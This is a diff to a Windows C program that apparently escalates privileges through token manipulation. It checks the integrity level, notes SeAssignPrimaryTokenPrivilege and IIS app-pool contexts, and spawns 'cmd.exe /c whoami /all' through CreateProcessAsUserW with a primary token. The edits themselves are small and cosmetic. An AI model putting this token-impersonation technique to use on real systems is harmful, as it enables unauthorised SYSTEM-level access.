@@ -13,7 +13,7 @@ int wmain()
 	PTOKEN_MANDATORY_LABEL MandatoryIntegrityLevel = NULL;
 	LPWSTR IntegritySidString = NULL;
 
-	if (SharedUserData->NtMajorVersion >= 6 && SharedUserData->NtMinorVersion >= 2)
+	if ((SharedUserData->NtMajorVersion == 6 && SharedUserData->NtMinorVersion >= 2) || SharedUserData->NtMajorVersion > 6)
 	{
 		NtCurrentProcessToken = NtCurrentProcessToken();
 		NtCurrentThreadToken = NtCurrentThreadToken();
@@ -48,7 +48,7 @@ int wmain()
 
 	if (IsTokenElevatedLimited(NtCurrentProcessToken))
 	{
-		//Get SeAssignPrimaryTokenPrivilege Still Possible
+		// Get SeAssignPrimaryTokenPrivilege Still Possible
 		wprintf(L"[-] Token Elevated Limited, exiting..,\n");
 		return ERROR_ELEVATION_REQUIRED;
 	}
@@ -72,7 +72,7 @@ int wmain()
 		wprintf(L"[+] Integrity Level >= System OK!\n");
 	else
 	{
-		//just a warning, IIS APPPOOL\DefaultAppPool [High Mandatory Level] Work
+		// Just a warning, IIS APPPOOL\DefaultAppPool [High Mandatory Level] Work
 		wprintf(L"[!] Warning! Integrity Level < System, Current IntegrityRID: 0x%08x\n", IntegritySid.SubAuthority[0]);
 	}
 
@@ -114,7 +114,7 @@ int wmain()
 		RtlSecureZeroMemory(&pi, sizeof(pi));
 		wchar_t cmd[MAX_PATH] = L"cmd.exe /c whoami.exe /all > C:\\Users\\Public\\whoami.txt";
 		BOOL IsCreateSucess = CreateProcessAsUserW(PrimaryTokenHandle, NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &pi);//NtCreateUserProcess if you like
-		wprintf(L"[*] Exec: %ls, IsCreateSucess = %d\n", cmd, IsCreateSucess);
+		wprintf(L"[*] CreateProcessAsUserW: %ls, IsCreateSucess = %d\n", cmd, IsCreateSucess);
 		wprintf(L"[*] Last Win32Error: %d\n", NtCurrentTeb()->LastErrorValue);
 		wprintf(L"[*] Last NtstatusError: 0x%08x\n", NtCurrentTeb()->LastStatusValue);
 		if (IsCreateSucess == TRUE)
@@ -128,7 +128,7 @@ int wmain()
 		NtClose(PrimaryTokenHandle);
 		NtClose(pi.hProcess);
 		NtClose(pi.hThread);
-		Sleep(3000);
+		Sleep(2000);
 	}
 
 	return 0;
